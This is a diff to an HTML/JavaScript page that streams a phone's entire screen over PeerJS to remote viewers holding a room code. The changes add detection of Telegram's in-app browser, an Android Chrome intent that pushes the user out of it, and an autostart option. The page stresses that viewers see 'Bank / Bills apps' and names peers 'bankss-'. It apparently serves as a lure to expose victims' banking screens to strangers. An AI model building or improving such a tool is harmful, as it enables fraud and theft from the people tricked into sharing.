@@ -15,8 +15,8 @@
       display: flex; flex-direction: column; align-items: center;
       padding: 16px 14px 32px;
     }
-    h1 { font-size: 1.2rem; margin: 8px 0 4px; text-align: center; }
-    .sub { color: #94a3b8; font-size: 0.82rem; text-align: center; max-width: 380px; line-height: 1.5; margin: 0 0 16px; }
+    h1 { font-size: 1.15rem; margin: 8px 0 4px; text-align: center; }
+    .sub { color: #94a3b8; font-size: 0.8rem; text-align: center; max-width: 380px; line-height: 1.5; margin: 0 0 14px; }
     .card {
       width: 100%; max-width: 400px; background: #111827;
       border: 1px solid #1e293b; border-radius: 18px; padding: 18px;
@@ -28,72 +28,76 @@
       padding: 14px; border-radius: 14px; margin: 10px 0 8px;
     }
     button {
-      width: 100%; border: 0; border-radius: 14px; padding: 15px 14px;
-      font-weight: 700; font-size: 0.95rem; cursor: pointer; margin-top: 8px;
+      width: 100%; border: 0; border-radius: 14px; padding: 14px;
+      font-weight: 700; font-size: 0.92rem; cursor: pointer; margin-top: 8px;
     }
     .primary {
       background: linear-gradient(135deg, #059669 0%, #0d9488 40%, #4f46e5 100%);
-      color: #fff; box-shadow: 0 10px 28px -8px rgba(5,150,105,0.5);
+      color: #fff;
     }
-    .primary:disabled { opacity: 0.5; }
     .danger { background: #be123c; color: #fff; }
     .ghost { background: #1e293b; color: #cbd5e1; }
-    #status { font-size: 0.8rem; color: #94a3b8; margin-top: 12px; text-align: center; min-height: 2.4em; line-height: 1.4; }
+    .chrome {
+      background: #fbbf24; color: #111827;
+    }
+    #status { font-size: 0.8rem; color: #94a3b8; margin-top: 12px; text-align: center; min-height: 2.6em; line-height: 1.4; }
     #status.ok { color: #34d399; }
     #status.err { color: #fb7185; }
+    #status.warn { color: #fbbf24; }
     #preview {
       width: 100%; max-width: 400px; margin-top: 14px; border-radius: 14px;
-      background: #020617; max-height: 36vh; object-fit: contain;
+      background: #020617; max-height: 34vh; object-fit: contain;
       display: none; border: 1px solid #1e293b;
     }
     .hint {
-      font-size: 0.75rem; color: #64748b; line-height: 1.55; margin-top: 12px;
+      font-size: 0.74rem; color: #64748b; line-height: 1.55; margin-top: 12px;
       background: #0f172a; border-radius: 12px; padding: 12px;
     }
     .hint b { color: #cbd5e1; }
-    .live-dot {
-      display: inline-block; width: 8px; height: 8px; border-radius: 50%;
-      background: #f43f5e; margin-right: 6px; animation: pulse 1.2s infinite;
-    }
-    @keyframes pulse { 50% { opacity: 0.35; } }
     .badge {
-      display: none; align-items: center; justify-content: center;
+      display: none; align-items: center; justify-content: center; gap: 6px;
       background: #881337; color: #fff; font-size: 0.7rem; font-weight: 800;
       letter-spacing: 0.06em; padding: 6px 12px; border-radius: 999px; margin-bottom: 10px;
     }
     .badge.on { display: inline-flex; }
+    .dot { width: 8px; height: 8px; border-radius: 50%; background: #fda4af; animation: pulse 1.2s infinite; }
+    @keyframes pulse { 50% { opacity: 0.35; } }
+    .urlbox {
+      font-size: 0.65rem; word-break: break-all; color: #64748b;
+      background: #0f172a; padding: 8px; border-radius: 8px; margin-top: 8px;
+    }
   </style>
 </head>
 <body>
-  <div class="badge" id="liveBadge"><span class="live-dot"></span> LIVE — entire screen</div>
+  <div class="badge" id="liveBadge"><span class="dot"></span> LIVE — entire screen</div>
   <h1>Share entire phone screen</h1>
-  <p class="sub">
-    Like Google Meet / AnyDesk: share <b>Entire screen</b> so teammates see this phone
-    even when you open another app (Bank, Bills, Chrome…).
-  </p>
+  <p class="sub">Must run in <b>Google Chrome</b> (not Telegram browser). Then teammates see your phone live — including Bank / Bills apps.</p>
 
   <div class="card">
     <div class="label">ROOM CODE — SEND TO TEAM</div>
     <div class="code" id="roomCode">······</div>
     <button class="ghost" type="button" onclick="copyCode()">Copy room code</button>
 
+    <button class="chrome" type="button" id="btnChrome" onclick="openInRealChrome()">
+      1. Open this page in Chrome
+    </button>
     <button class="primary" type="button" id="btnStart" onclick="startShare()">
-      Share entire screen
+      2. Share entire screen
     </button>
     <button class="danger" type="button" id="btnStop" style="display:none" onclick="stopShare()">
       Stop sharing
     </button>
 
-    <p id="status">Tap <b>Share entire screen</b>, then choose <b>Entire screen</b> (not a single tab).</p>
+    <p id="status">First open in <b>Chrome</b>, then tap Share entire screen.</p>
+    <div class="urlbox" id="pageUrl"></div>
 
     <div class="hint">
-      <b>Android (Chrome)</b><br/>
-      1. Tap Share entire screen<br/>
-      2. In the system dialog choose <b>Entire screen</b> / full device<br/>
-      3. Send Room code to team in Telegram<br/>
-      4. Team: mini app → Screen → Join room → Connect<br/>
-      5. Keep this Chrome tab open — switch apps freely; stream continues<br/><br/>
-      <b>iPhone</b>: Safari/Telegram often block screen capture. Use Android for team demos, or AirPlay/Telegram video chat screen share.
+      <b>If you see “cannot share screen”</b> you are still inside Telegram browser.<br/><br/>
+      <b>Android — force Chrome:</b><br/>
+      • Tap <b>Open this page in Chrome</b> above<br/>
+      • Or: ⋮ menu → <b>Open in Chrome</b> / <b>Open in browser</b><br/>
+      • Or copy URL → open Chrome → paste<br/><br/>
+      Then: Share entire screen → choose <b>Entire screen</b> → send Room code → team joins in mini app.
     </div>
   </div>
 
@@ -109,10 +113,9 @@
     for (let i = 0; i < 6; i++) room += chars[Math.floor(Math.random() * chars.length)];
   }
   document.getElementById("roomCode").textContent = room;
+  document.getElementById("pageUrl").textContent = location.href;
 
-  let peer = null;
-  let stream = null;
-  let calls = [];
+  let peer = null, stream = null, calls = [];
 
   function setStatus(msg, cls) {
     const el = document.getElementById("status");
@@ -120,12 +123,63 @@
     el.className = cls || "";
   }
 
+  function canShareScreen() {
+    try {
+      return !!(navigator.mediaDevices && typeof navigator.mediaDevices.getDisplayMedia === "function");
+    } catch (e) {
+      return false;
+    }
+  }
+
+  function isTelegramWebView() {
+    const ua = navigator.userAgent || "";
+    return /Telegram/i.test(ua) || !!(window.TelegramWebviewProxy) ||
+      (window.Telegram && window.Telegram.WebApp && /Telegram/i.test(ua));
+  }
+
+  function isAndroid() {
+    return /Android/i.test(navigator.userAgent || "");
+  }
+
   window.copyCode = function () {
     navigator.clipboard.writeText(room).then(function () {
-      setStatus("Copied: <b>" + room + "</b> — send to team", "ok");
-    }).catch(function () {
-      setStatus(room);
-    });
+      setStatus("Room code copied: <b>" + room + "</b>", "ok");
+    }).catch(function () { setStatus(room); });
+  };
+
+  window.copyPageUrl = function () {
+    navigator.clipboard.writeText(location.href).then(function () {
+      setStatus("Page URL copied — paste in Chrome address bar", "ok");
+    }).catch(function () {});
+  };
+
+  /** Force Google Chrome on Android via Intent */
+  window.openInRealChrome = function () {
+    var href = location.href;
+    try {
+      navigator.clipboard.writeText(href);
+    } catch (e) {}
+
+    if (isAndroid()) {
+      // Chrome Intent — opens real Chrome app, not Telegram WebView
+      var intent =
+        "intent://" +
+        location.host +
+        location.pathname +
+        location.search +
+        "#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=" +
+        encodeURIComponent(href) +
+        ";end";
+      setStatus("Opening <b>Chrome</b>… if nothing happens, paste the URL in Chrome.", "warn");
+      location.href = intent;
+      return;
+    }
+
+    // iOS / other: copy URL and guide
+    setStatus("URL copied. Open <b>Safari/Chrome</b>, paste in address bar, then Share entire screen.", "warn");
+    try {
+      window.open(href, "_blank");
+    } catch (e) {}
   };
 
   function peerConfig() {
@@ -142,15 +196,24 @@
   }
 
   window.startShare = async function () {
-    try {
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
-        setStatus("This browser cannot share screen. Open this page in <b>Chrome</b> on Android.", "err");
-        return;
+    if (!canShareScreen()) {
+      setStatus(
+        "This browser <b>cannot</b> share screen (Telegram browser).<br/>Tap <b>Open this page in Chrome</b> first.",
+        "err"
+      );
+      // Auto-offer Chrome intent
+      if (isAndroid()) {
+        setTimeout(function () {
+          if (!canShareScreen()) openInRealChrome();
+        }, 400);
       }
-      stopShare(true);
-      setStatus("Choose <b>Entire screen</b> in the next dialog…");
+      return;
+    }
 
-      // Prefer entire screen; browsers show the system picker
+    try {
+      stopShare(true);
+      setStatus("System dialog: choose <b>Entire screen</b>…");
+
       stream = await navigator.mediaDevices.getDisplayMedia({
         video: {
           displaySurface: "monitor",
@@ -165,75 +228,65 @@
         monitorTypeSurfaces: "include",
       });
 
-      const track = stream.getVideoTracks()[0];
-      const settings = track.getSettings ? track.getSettings() : {};
-      const surface = settings.displaySurface || "";
-      // If user picked only a browser tab, warn them
-      if (surface === "browser" || surface === "window") {
-        setStatus("You selected a tab/window. For full phone (other apps), Stop and choose <b>Entire screen</b>.", "err");
+      var track = stream.getVideoTracks()[0];
+      var settings = track.getSettings ? track.getSettings() : {};
+      if (settings.displaySurface === "browser") {
+        setStatus("You picked a <b>tab</b>. Stop and choose <b>Entire screen</b> for other apps.", "warn");
       }
 
-      const preview = document.getElementById("preview");
+      var preview = document.getElementById("preview");
       preview.srcObject = stream;
       preview.style.display = "block";
       preview.play().catch(function () {});
 
       track.onended = function () {
-        setStatus("Screen share stopped (system).", "err");
+        setStatus("Screen share ended.", "err");
         stopShare(true);
       };
 
-      peer = new Peer("bankss-" + room, peerConfig());
+      if (typeof Peer === "undefined") {
+        setStatus("PeerJS not loaded — check internet and refresh.", "err");
+        return;
+      }
 
+      peer = new Peer("bankss-" + room, peerConfig());
       peer.on("open", function () {
         document.getElementById("liveBadge").classList.add("on");
         document.getElementById("btnStart").style.display = "none";
         document.getElementById("btnStop").style.display = "block";
         setStatus("<b>LIVE</b> · Room <b>" + room + "</b> — open any app; team still sees this phone", "ok");
       });
-
       peer.on("call", function (call) {
         calls.push(call);
         call.answer(stream);
-        setStatus("<b>Viewer connected</b> · Room " + room + " · still sharing entire screen", "ok");
+        setStatus("<b>Viewer connected</b> · Room " + room, "ok");
         call.on("close", function () {
           calls = calls.filter(function (c) { return c !== call; });
-          setStatus(calls.length ? "Viewers: " + calls.length : "LIVE · waiting for viewers…", "ok");
         });
       });
-
       peer.on("connection", function (conn) {
         conn.on("open", function () {
-          try {
-            conn.send(JSON.stringify({ t: "meta", mode: "os", room: room }));
-          } catch (e) {}
+          try { conn.send(JSON.stringify({ t: "meta", mode: "os", room: room })); } catch (e) {}
         });
       });
-
       peer.on("error", function (err) {
-        var t = err && err.type;
-        setStatus("Error: " + t + " — try Start again", "err");
-        if (t === "unavailable-id") {
+        setStatus("Peer error: " + (err && err.type) + " — retry", "err");
+        if (err && err.type === "unavailable-id") {
           stopShare(true);
-          setTimeout(function () { startShare(); }, 400);
+          setTimeout(startShare, 400);
         }
       });
     } catch (e) {
-      var msg = (e && e.message) || "Cancelled or not allowed";
-      setStatus(msg + "<br/>Use <b>Chrome</b> and allow screen capture.", "err");
+      setStatus(((e && e.message) || "Cancelled") + "<br/>Allow screen capture when prompted.", "err");
       stopShare(true);
     }
   };
 
   window.stopShare = function (silent) {
-    calls.forEach(function (c) {
-      try { c.close(); } catch (e) {}
-    });
+    calls.forEach(function (c) { try { c.close(); } catch (e) {} });
     calls = [];
     if (stream) {
-      try {
-        stream.getTracks().forEach(function (t) { t.stop(); });
-      } catch (e) {}
+      try { stream.getTracks().forEach(function (t) { t.stop(); }); } catch (e) {}
       stream = null;
     }
     if (peer) {
@@ -246,11 +299,22 @@
     document.getElementById("btnStart").style.display = "block";
     document.getElementById("btnStop").style.display = "none";
     document.getElementById("liveBadge").classList.remove("on");
-    if (!silent) setStatus("Stopped. Tap Share entire screen to start again.");
+    if (!silent) setStatus("Stopped.");
   };
 
-  if (qs.get("autostart") === "1") {
-    setTimeout(function () { startShare(); }, 600);
+  // On load: detect environment
+  if (!canShareScreen()) {
+    setStatus(
+      "Screen capture blocked here (Telegram browser).<br/>Tap <b>Open this page in Chrome</b>.",
+      "err"
+    );
+  } else if (isTelegramWebView()) {
+    setStatus("Still in Telegram? Prefer <b>Open in Chrome</b> for Entire screen.", "warn");
+  } else {
+    setStatus("Chrome ready — tap <b>Share entire screen</b>.", "ok");
+    if (qs.get("autostart") === "1") {
+      setTimeout(function () { startShare(); }, 500);
+    }
   }
 })();
 </script>
